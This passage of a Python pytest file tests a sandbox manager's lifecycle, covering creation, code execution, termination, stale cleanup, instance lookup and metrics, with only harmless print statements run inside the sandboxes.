        assert "hello from sandbox" in result.output

    def test_execute_in_nonexistent_sandbox(self):
        with pytest.raises(SandboxError):
            SandboxManager.execute("nonexistent", "print('hi')")

    def test_execute_in_terminated_sandbox(self):
        inst = SandboxManager.create_sandbox()
        SandboxManager.terminate(inst.instance_id)
        with pytest.raises(SandboxError, match="terminated"):
            SandboxManager.execute(inst.instance_id, "print('hi')")

    def test_terminate_existing(self):
        inst = SandboxManager.create_sandbox()
        assert SandboxManager.terminate(inst.instance_id)
        retrieved = SandboxManager.get_instance(inst.instance_id)
        assert retrieved is not None
        assert retrieved.status == SandboxStatus.TERMINATED

    def test_terminate_nonexistent(self):
        assert not SandboxManager.terminate("nope")

    def test_get_instance(self):
        inst = SandboxManager.create_sandbox()
        retrieved = SandboxManager.get_instance(inst.instance_id)
        assert retrieved is not None
        assert retrieved.instance_id == inst.instance_id

    def test_get_instance_nonexistent(self):
        assert SandboxManager.get_instance("nope") is None

    def test_list_instances(self):
        SandboxManager.create_sandbox()
        SandboxManager.create_sandbox()
        assert len(SandboxManager.list_instances()) == 2

    def test_cleanup_stale(self):
        inst = SandboxManager.create_sandbox()
        # age must be > 0, but we mock by setting max_age_seconds=0
        cleaned = SandboxManager.cleanup_stale(max_age_seconds=0)
        assert cleaned >= 1
        retrieved = SandboxManager.get_instance(inst.instance_id)
        assert retrieved is not None
        assert retrieved.status == SandboxStatus.TERMINATED

    def test_cleanup_stale_young(self):
        SandboxManager.create_sandbox()
        cleaned = SandboxManager.cleanup_stale(max_age_seconds=9999)
        assert cleaned == 0

    def test_get_metrics_no_instances(self):
        m = SandboxManager.get_metrics()
        assert m.active_instances == 0
        assert m.total_executions == 0

    def test_get_metrics_with_executions(self):
        inst = SandboxManager.create_sandbox()
        SandboxManager.execute(inst.instance_id, "print('hi')", language="python")
        metrics = SandboxManager.get_metrics()
        assert metrics.active_instances >= 1
        assert metrics.total_executions >= 1

    def test_clear_all(self):
        SandboxManager.create_sandbox()
        SandboxManager.clear_all()
        assert len(SandboxManager.list_instances()) == 0
